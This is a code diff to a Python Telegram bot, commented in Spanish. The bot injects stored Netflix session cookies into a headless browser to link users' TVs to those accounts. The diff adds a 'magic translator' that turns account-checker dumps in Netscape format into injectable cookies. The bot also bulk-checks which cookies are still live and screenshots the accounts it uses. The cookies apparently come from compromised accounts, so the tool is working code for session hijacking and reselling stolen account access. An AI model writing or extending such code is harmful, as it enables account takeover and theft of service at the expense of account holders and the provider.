@@ -28,7 +28,7 @@ def init_db():
         if not os.path.exists('database.json'):
             return {
                 'cookies_list': [], 
-                'admins': [], 
+                'admins': [SUPER_ADMIN_ID], 
                 'maintenance_mode': False,
                 'banned_users': [],
                 'user_profiles': {},
@@ -41,10 +41,12 @@ def init_db():
                 if 'banned_users' not in db: db['banned_users'] = []
                 if 'user_profiles' not in db: db['user_profiles'] = {}
                 if 'stats' not in db: db['stats'] = {'total_activations': 0, 'failed_attempts': 0}
+                if 'admins' not in db: db['admins'] = [SUPER_ADMIN_ID]
+                if SUPER_ADMIN_ID not in db['admins']: db['admins'].append(SUPER_ADMIN_ID)
                 return db
         except:
             return {
-                'cookies_list': [], 'admins': [], 'maintenance_mode': False,
+                'cookies_list': [], 'admins': [SUPER_ADMIN_ID], 'maintenance_mode': False,
                 'banned_users': [], 'user_profiles': {},
                 'stats': {'total_activations': 0, 'failed_attempts': 0}
             }
@@ -92,11 +94,35 @@ def clean_old_screenshots():
             try: os.remove(file)
             except: pass
 
+def parse_netscape_cookies(text):
+    """Traductor Mágico: Convierte el formato texto de los Checkers a JSON de Playwright."""
+    cookies = []
+    for line in text.split('\n'):
+        line = line.strip()
+        # Ignorar líneas vacías o cabeceras del checker (KANT FLIX, Email, etc.)
+        if not line or not line.startswith('.'): 
+            continue
+        
+        # Separar por espacios o tabulaciones
+        parts = line.split()
+        if len(parts) >= 7:
+            domain = parts[0]
+            path = parts[2]
+            secure = parts[3].upper() == 'TRUE'
+            name = parts[5]
+            value = parts[6]
+            
+            cookies.append({
+                "name": name,
+                "value": value,
+                "domain": domain,
+                "path": path,
+                "secure": secure
+            })
+    return cookies
+
 def run_playwright_activation(code, cookie_data):
-    """
-    Motor principal: Inicia navegador, inyecta cookie y activa la TV.
-    Tiene auto-cierre para no reventar la RAM.
-    """
+    """Motor principal: Inicia navegador, inyecta cookie y activa la TV."""
     screenshot_path = f"error_{int(time.time())}.png"
     browser = None
     try:
@@ -132,7 +158,7 @@ def run_playwright_activation(code, cookie_data):
                     error_text = page.locator('.ui-message-error, [data-uia="error-message-container"]').first.text_content()
                     return False, f"❌ Netflix rechazó el código: {error_text}", screenshot_path
                 
-                return True, "✅ ¡TV Activada con éxito! Ya puedes disfrutar en tu televisión.", None
+                return True, "🎉 ¡**TV Activada con éxito**! 📺✨\n\nTu televisor ha sido enlazado correctamente con nuestra cuenta. ¡Prepara las palomitas y disfruta!", None
                 
             except Exception as e:
                 page.screenshot(path=screenshot_path)
@@ -154,7 +180,6 @@ def check_cookie_validity(cookie_data):
             context.add_cookies(cookies)
             page = context.new_page()
             
-            # Navegar a la página principal y esperar a ver si carga perfiles
             page.goto('https://www.netflix.com/browse', timeout=30000)
             time.sleep(4)
             is_valid = "login" not in page.url.lower() and "logout" not in page.url.lower()
@@ -176,7 +201,7 @@ def background_spy(chat_id, msg_id, cookie_data):
             context.add_cookies(cookies)
             page = context.new_page()
             page.goto('https://www.netflix.com/browse', timeout=40000)
-            time.sleep(6) # Esperar a que renderice la interfaz
+            time.sleep(6) 
             page.screenshot(path=screenshot_path)
             
             with open(screenshot_path, 'rb') as photo:
@@ -191,6 +216,26 @@ def background_spy(chat_id, msg_id, cookie_data):
         if os.path.exists(screenshot_path):
             try: os.remove(screenshot_path)
             except: pass
+
+def background_check_cookies(chat_id):
+    """Evalúa toda la DB y manda un ticket de diagnóstico."""
+    db = init_db()
+    buenas = 0
+    malas = 0
+    report = "📋 **REPORTE DE DIAGNÓSTICO** 📋\n\n"
+    for i, c in enumerate(db['cookies_list']):
+        if c['status'] == 'active':
+            is_valid = check_cookie_validity(c['data'])
+            if not is_valid:
+                db['cookies_list'][i]['status'] = 'exhausted'
+                malas += 1
+                report += f"❌ Cuenta #{i+1} ({c.get('country','N/A')}) ➔ `Caducada`\n"
+            else:
+                buenas += 1
+                report += f"✅ Cuenta #{i+1} ({c.get('country','N/A')}) ➔ `Operativa`\n"
+    save_db(db)
+    report += f"\n📊 **Resumen Global:** {buenas} Vivas | {malas} Eliminadas."
+    bot.send_message(chat_id, report, parse_mode="Markdown")
 
 def main_user_keyboard(user_id):
     """Teclado inferior persistente."""
@@ -340,7 +385,7 @@ def process_tv_code(message, country):
         return
         
     success, result_msg, screenshot_path = run_playwright_activation(tv_code, available_cookie['data'])
-    db = init_db() # Recargar DB por si hubo cambios
+    db = init_db() 
     
     if success:
         db['cookies_list'][cookie_index]['uses'] += 1
@@ -354,10 +399,12 @@ def process_tv_code(message, country):
             
         save_db(db)
         bot.reply_to(message, result_msg)
-        bot.send_message(SUPER_ADMIN_ID, f"✅ Usuario @{message.from_user.username} (ID: {user_id}) ha activado el código: `{tv_code}` en la región {country}.\nUsos: {db['cookies_list'][cookie_index]['uses']}/{MAX_USES_PER_COOKIE}")
+        
+        for admin in db.get('admins', []):
+            try: bot.send_message(admin, f"✅ Usuario @{message.from_user.username} (ID: {user_id}) ha activado el código: `{tv_code}` en la región {country}.\nUsos: {db['cookies_list'][cookie_index]['uses']}/{MAX_USES_PER_COOKIE}")
+            except: pass
     else:
         db['stats']['failed_attempts'] += 1
-        # Si el error es de caducidad, auto-reparar
         if "caducado" in result_msg.lower():
             db['cookies_list'][cookie_index]['status'] = 'exhausted'
             
@@ -365,12 +412,17 @@ def process_tv_code(message, country):
         bot.reply_to(message, "❌ Hubo un problema al activar tu TV. Los administradores han sido notificados para revisarlo.")
         
         admin_error = f"⚠️ Fallo al activar `{tv_code}` de @{message.from_user.username}.\nMotivo: {result_msg}"
+        for admin in db.get('admins', []):
+            try:
+                if screenshot_path and os.path.exists(screenshot_path):
+                    with open(screenshot_path, 'rb') as photo:
+                        bot.send_photo(admin, photo, caption=admin_error)
+                else:
+                    bot.send_message(admin, admin_error)
+            except: pass
+            
         if screenshot_path and os.path.exists(screenshot_path):
-            with open(screenshot_path, 'rb') as photo:
-                bot.send_photo(SUPER_ADMIN_ID, photo, caption=admin_error)
             os.remove(screenshot_path)
-        else:
-            bot.send_message(SUPER_ADMIN_ID, admin_error)
 
 @bot.message_handler(func=lambda m: m.text == "👑 Panel Admin")
 @bot.message_handler(commands=['admin'])
@@ -531,24 +583,31 @@ def manage_security_actions(call):
 
 def process_add_cookie_country(message):
     country = message.text.strip().capitalize()
-    msg = bot.send_message(message.chat.id, f"País: **{country}**\n\n🍪 Pega ahora el código JSON gigante de la cookie:", parse_mode="Markdown")
+    msg = bot.send_message(message.chat.id, f"País: **{country}**\n\n🍪 Pega ahora el texto de la cuenta (JSON o formato del Checker):", parse_mode="Markdown")
     bot.register_next_step_handler(msg, lambda m: process_add_cookie_data(m, country))
 
 def process_add_cookie_data(message, country):
     cookie_data_str = message.text.strip()
     try:
-        json.loads(cookie_data_str) 
-        db = init_db()
-        db['cookies_list'].append({
-            'country': country,
-            'data': cookie_data_str,
-            'uses': 0,
-            'status': 'active'
-        })
-        save_db(db)
-        bot.reply_to(message, f"✅ *Cookie guardada*\nSe ha asignado a **{country}**. Límite: {MAX_USES_PER_COOKIE} usos.", parse_mode="Markdown")
+        # Intentar leer como JSON primero
+        parsed_cookies = json.loads(cookie_data_str)
     except json.JSONDecodeError:
-        bot.reply_to(message, "❌ *Error de formato:*\nNo es un JSON válido.")
+        # Si falla, el bot usará el nuevo Traductor Mágico para Netscape
+        parsed_cookies = parse_netscape_cookies(cookie_data_str)
+        
+    if not parsed_cookies:
+        bot.reply_to(message, "❌ *Error de formato:*\nNo he podido reconocer ninguna cookie. Asegúrate de que es JSON o formato Netscape válido.")
+        return
+
+    db = init_db()
+    db['cookies_list'].append({
+        'country': country,
+        'data': json.dumps(parsed_cookies) if isinstance(parsed_cookies, list) else parsed_cookies,
+        'uses': 0,
+        'status': 'active'
+    })
+    save_db(db)
+    bot.reply_to(message, f"✅ *Cookie guardada con éxito*\nSe ha detectado el formato y asignado a **{country}**. Límite: {MAX_USES_PER_COOKIE} usos.", parse_mode="Markdown")
 
 def process_bulk_country(message):
     country = message.text.strip().capitalize()
@@ -630,31 +689,12 @@ def process_broadcast(message):
         try:
             bot.send_message(int(uid_str), f"🔔 **MENSAJE DEL ADMINISTRADOR** 🔔\n\n{texto}", parse_mode="Markdown")
             enviados += 1
-            time.sleep(0.1) # Evitar flood de Telegram
+            time.sleep(0.1) 
         except:
-            pass # Si el usuario bloqueó el bot, ignoramos
+            pass 
             
     bot.send_message(message.chat.id, f"✅ Mensaje general enviado a {enviados} usuarios.")
 
-def background_check_cookies(chat_id):
-    """Evalúa toda la DB y manda un ticket de diagnóstico."""
-    db = init_db()
-    buenas = 0
-    malas = 0
-    report = "📋 **REPORTE DE DIAGNÓSTICO** 📋\n\n"
-    for i, c in enumerate(db['cookies_list']):
-        if c['status'] == 'active':
-            is_valid = check_cookie_validity(c['data'])
-            if not is_valid:
-                db['cookies_list'][i]['status'] = 'exhausted'
-                malas += 1
-                report += f"❌ Cuenta #{i+1} ({c.get('country','N/A')}) ➔ `Caducada`\n"
-            else:
-                buenas += 1
-                report += f"✅ Cuenta #{i+1} ({c.get('country','N/A')}) ➔ `Operativa`\n"
-    save_db(db)
-    report += f"\n📊 **Resumen Global:** {buenas} Vivas | {malas} Eliminadas."
-    bot.send_message(chat_id, report, parse_mode="Markdown")
 
 @app.route('/')
 def home():
